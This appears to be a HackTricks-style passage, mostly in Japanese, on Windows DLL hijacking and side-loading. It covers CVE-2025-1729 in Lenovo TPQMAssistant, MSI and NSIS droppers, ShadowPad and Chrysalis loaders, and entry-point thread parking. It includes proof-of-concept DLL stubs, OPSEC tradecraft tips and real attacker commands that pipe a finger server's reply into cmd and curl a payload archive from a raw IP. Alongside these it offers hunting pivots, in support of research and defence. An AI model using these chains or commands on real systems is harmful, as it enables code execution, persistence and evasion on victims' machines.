この case では、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を取り上げます。これは **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、logon user の context で毎日午前 9:30 に実行されます。
- **Directory Permissions**: `CREATOR OWNER` による書き込みが可能で、local user は arbitrary files を配置できます。
- **DLL Search Behavior**: 最初に working directory から `hostfxr.dll` の load を試み、見つからない場合は "NAME NOT FOUND" を log に記録します。これは local directory search precedence を示しています。

### Exploit Implementation

attacker は同じ directory に malicious な `hostfxr.dll` stub を配置できます。missing DLL を exploit することで、user context で code execution を実現できます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 標準ユーザーとして `hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるまで待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性レベルで管理者のセッション内で実行されます。
4. 標準的な UAC bypass techniques を連鎖させ、中程度の整合性レベルから SYSTEM 権限へ昇格します。

## Case Study: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) 経由の DLL Side-Loading

脅威アクターは、信頼された signed process の下で payload を実行するために、MSI-based droppers と DLL side-loading を組み合わせることが頻繁にあります。<sup>[[10]](#references)</sup>

Chain overview
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction（例: LaunchApplication または VBScript action）がサイレントに実行され、embedded resources から次の stage を再構築します。
- Dropper は、正規の signed EXE と悪意のある DLL を同じディレクトリに書き込みます（ペアの例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- signed EXE が起動されると、Windows DLL search order により最初に working directory から wsc.dll がロードされ、signed parent の下で attacker code が実行されます（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- executable または VBScript を実行するエントリを探します。疑わしいパターンの例: background で embedded file を実行する LaunchApplication。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary tables を調査します。
- MSI CAB 内の Embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用します: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される、複数の小さな fragments を探します。一般的な flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 以下の2つのファイルを同じフォルダに配置します：
- wsc_proxy.exe：正規の署名済みホスト（Avast）。このプロセスは、ディレクトリ内から名前で wsc.dll の読み込みを試みます。
- wsc.dll：攻撃者の DLL。特定の exports が不要な場合は DllMain で十分です。それ以外の場合は proxy DLL をビルドし、payload を DllMain で実行しながら、必要な exports を本物のライブラリへ転送します。
- 最小限の DLL payload をビルドします：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export requirementsには、proxying framework（例：DLLirant/Spartacus）を使用して、payloadも実行するforwarding DLLを生成します。

- このtechniqueは、host binaryによるDLL name resolutionに依存します。hostがabsolute pathまたはsafe loading flag（例：LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、forwarded exportsはprecedenceに影響するため、host binaryとexport setの選定時に考慮する必要があります。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Pointは、Ink Dragonがディスク上でcore payloadを暗号化したまま、正規softwareに紛れ込ませるために**three-file triad**を使用してShadowPadを展開する方法を説明しました。<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD、Realtek、NVIDIAなどのvendorが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者はWindows binaryに見えるよう実行ファイルの名前を変更します（例：`conhost.exe`）。ただし、Authenticode signatureは有効なままです。
2. **Malicious loader DLL** – EXEの隣に、想定される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）で配置されます。このDLLは通常、ScatterBrain frameworkでobfuscateされたMFC binaryであり、encrypted blobを探し、decryptし、ShadowPadをreflectively mapすることだけが役割です。
3. **Encrypted payload blob** – 同じdirectory内に`<name>.tmp`として保存されることが多くあります。decrypted payloadをmemory-mapした後、loaderはforensic evidenceを破壊するためTMP fileを削除します。

Tradecraft notes:

* signed EXEの名前を変更し（PE header内の元の`OriginalFileName`は維持）、Windows binaryを装いながらvendor signatureを保持できます。そのため、Ink Dragonの手法を再現する場合は、実体がAMD/NVIDIA utilityである`conhost.exe`風のbinaryを配置します。
* executableはtrustedのままなので、allowlisting controlの大半では、malicious DLLをその隣に配置するだけで済みます。loader DLLのcustomizationに注力し、signed parentは通常そのまま実行できます。
* ShadowPadのdecryptorは、TMP blobがloaderの隣にあり、mapping後にfileをzero化できるようwritableであることを想定しています。payloadがloadされるまでdirectoryを書き込み可能に保ち、memory上に入った後はOPSECのためTMP fileを安全に削除できます。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

OperatorsはDLL sideloadingとLOLBASを組み合わせ、ディスク上のcustom artifactをtrusted EXEの隣に置くmalicious DLLだけにします。<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShellが`cmd.exe /c`をspawnし、Finger serverからcommandsを取得して`cmd`にpipeします：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`はTCP/79のtextを取得し、`| cmd`がserver responseを実行するため、operatorsはsecond stage server-sideをrotateできます。

- **Built-in download/extract:** benign extensionでarchiveをdownloadし、unpackして、randomな`%LocalAppData%` folder配下にsideload targetとDLLをstageします：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`はprogressを隠し、redirectに従います。`tar -xf`はWindows built-in tarを使用します。

- **WMI/CIM launch:** WMI経由でEXEをstartし、colocated DLLのload中にtelemetry上ではCIM-created processとして表示されるようにします：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- `intelbq.exe`や`nearby_share.exe`など、local DLLを優先するbinaryで動作します。payload（例：Remcos）はtrusted nameの下で実行されます。

- **Hunting:** `/p`、`/m`、`/c`が同時に現れる`forfiles`にalertを設定します。admin script以外では珍しい組み合わせです。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近のLotus Blossom intrusionでは、trusted update chainを悪用して、DLL sideloadと完全なin-memory payloadsをstageするNSIS-packed dropperをdeliveryしました。<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe`（NSIS）は`%AppData%\Bluetooth`を作成して**HIDDEN**に設定し、名前を変更したBitdefender Submission Wizard `BluetoothService.exe`、malicious `log.dll`、encrypted blob `BluetoothService`をdropしてからEXEをlaunchします。
- host EXEは`log.dll`をimportし、`LogInit`/`LogWrite`をcallします。`LogInit`はblobをmmap-loadし、`LogWrite`はcustom LCG-based stream（constants **0x19660D** / **0x3C6EF35F**、prior hashからderivedしたkey material）でdecryptし、bufferをplaintext shellcodeでoverwriteしてtemporary dataをfreeし、shellcodeへjumpします。
- IATを避けるため、loaderはFNV-1a basis 0x811C9DC5 + prime 0x100019を使用してexport namesをhashし、続いてMurmur-style avalanche（**0x85EBCA6B**）を適用し、salted target hashesと比較してAPIをresolveします。

Main shellcode (Chrysalis)
- `gQ2JR&9;`というkeyを使用し、5 passにわたってadd/XOR/subを繰り返してPE-like main moduleをdecryptし、動的に`Kernel32.dll` → `GetProcAddress`をloadしてimport resolutionを完了します。
- runtimeでper-character bit-rotate/XOR transformによりDLL name stringsをreconstructし、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`をloadします。
- second resolverは**PEB → InMemoryOrderModuleList**をたどり、各export tableを4-byte block単位でMurmur-style mixingしながらparseします。hashが見つからない場合のみ`GetProcAddress`にfallbackします。

Embedded configuration & C2
- Configはdropされた`BluetoothService` file内の**offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7`でRC4-decryptするとC2 URLとUser-Agentが現れます。
- Beaconsはdot-delimited host profileを構築してtag `4Q`をprependし、key `vAuig34%^325hGV`でRC4-encryptしてから、HTTPS上で`HttpSendRequestA`を実行します。ResponsesはRC4-decryptされ、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）によってdispatchされます。
- Execution modeはCLI argsでgateされます：argsなし = `-i`を指すservice/Run key persistenceをinstall；`-i` = `-k`付きで自身をrelaunch；`-k` = installをskipしてpayloadを実行します。

Alternate loader observed
- 同じintrusionではTiny C Compilerもdropされ、`C:\ProgramData\USOShared\`から`libtcc.dll`を隣接させて`svchost.exe -nostdlib -run conf.c`を実行していました。attackerが提供したC sourceにはshellcodeがembeddedされ、PEをディスクに書き込むことなくcompileされ、memory内で実行されました。次の方法で再現できます：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は、実行時に `Wininet.dll` を import し、hardcoded URL から second-stage shellcode を取得することで、compiler run を装う柔軟な loader となっていました。

## Signed-host sideloading、export proxying、host thread parking

一部の DLL sideloading chain では、malicious DLL の load 後に crash するのではなく、legitimate host が後続 stage を正常に load できるだけ長く存続するよう、**stability engineering** が追加されています。<sup>[[11]](#references)</sup>

Observed pattern
- trusted EXE を malicious DLL と同じ場所に、`version.dll` のような想定される dependency name で配置する。
- malicious DLL は、想定されるすべての export を実際の system DLL（例: `%SystemRoot%\\System32\\version.dll`）へ **proxy** する。これにより import resolution が成功し、host process は動作を継続できる。
- load 後、malicious DLL は **host entry point** に patch を適用し、main thread が終了したり process を terminate する code path を実行したりせず、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を実行する。具体的には、next-stage DLL の name または path を復号し（RC4/XOR が一般的）、`LoadLibrary` で起動する。

Why this matters
- 通常の DLL proxying は API compatibility を維持するが、後続 stage のために host が十分長く存続することまでは保証しない。
- main thread を `Sleep(INFINITE)` で parking するのは、loader が worker thread で decryption、staging、または network bootstrap を実行する間、signed process を resident に保つ簡単な方法である。
- suspicious な `DllMain` だけを hunting していると、host entry point が patch され、secondary thread が開始された後に興味深い behavior が発生するこの pattern を見逃す可能性がある。

Minimal workflow
1. signed host EXE をコピーし、local directory から resolve される DLL を特定する。
2. 同じ function を export し、それらを legitimate DLL に forwarding する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. その thread から host entry point または main thread start routine に patch を適用し、`Sleep` を loop するようにする。
5. next-stage DLL の name/config を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

Defensive pivots
- `System32` ではなく、自身の application directory から `version.dll` または同様に一般的な library を load する signed process。
- image load の直後に process entry point へ適用される memory patch。特に、`Sleep`/`SleepEx` へ redirect される jump/call。
- proxy DLL によって作成され、復号された name を持つ second DLL に対して直ちに `LoadLibrary` を呼び出す thread。
- `ProgramData`、`%TEMP%`、または unpacked archive path のような writable staging directory 内で、vendor executable の隣に配置された full-export proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows における DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore が Europe を標的とする新たな Malware を Deploy](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks が Windows Helpers と遭遇するとき](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT を配布する進化する Impersonation Campaigns の Anatomy](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian Government を標的とする Threat Clusters の Analysis](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network と Stealthy Offensive Operation の内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom の toolkit の Deep Dive](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens の 2026 Espionage Campaigns を Tracking](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict 中の Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が Southeast Asian Governments と Critical Infrastructure を Target](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
